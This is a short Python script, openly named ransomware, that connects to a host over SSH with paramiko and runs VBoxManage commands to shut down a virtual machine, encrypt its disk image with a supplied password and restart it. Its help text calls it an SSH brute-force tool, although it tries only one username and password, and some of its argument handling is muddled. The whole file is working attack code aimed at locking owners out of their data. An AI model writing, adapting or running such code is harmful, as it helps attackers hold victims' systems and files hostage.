#!/usr/bin/env python3

import paramiko
import socket
import time
from colorama import init, Fore

# initialize colorama
init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

def ransomware(hostname, username, password, diskPath, passFile):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		client.connect(hostname=hostname, username=username, password=password, timeout=3)
	except socket.timeout:
		print("{}[!] Host: {} is unreachable, timed out.{}".format(RED, hostname, RESET))
		return False
	except paramiko.AuthenticationException:
		print("[!] Invalid credentials for {}:{}".format(username, password))
		return False
	except paramiko.SSHException:
		print("{}[*] Quota exceeded, retrying with delay...{}".format(BLUE, RESET))
		time.sleep(60)
		return ransomware(hostname, username, password, diskPath, passFile)
	else:
		stdin, stdout, stderr = client.exec_command('VBoxManage controlvm "debian-file" poweroff && VBoxManage encryptmedium "' + diskPath + '" --oldpassword "' + passFile + '" && VBoxManage startvm "debian-file"')
		return True

if __name__ == "__main__":
	import argparse
	parser = argparse.ArgumentParser(description="SSH Bruteforce Python script")
	parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce")
	parser.add_argument("-u", "--user", help="Host username")
	parser.add_argument("-p", "--password", help="Password")
	parser.add_argument("-d", "--disk", help="Disk Path")
	parser.add_argument("-P", "--passFile", help="Password File")

	args = parser.parse_args()
	host = args.host
	user = args.user
	password = args.password
	disk = args.disk
	passFile = args.passFile

	ransomware(host, user, password, disk, passFile)
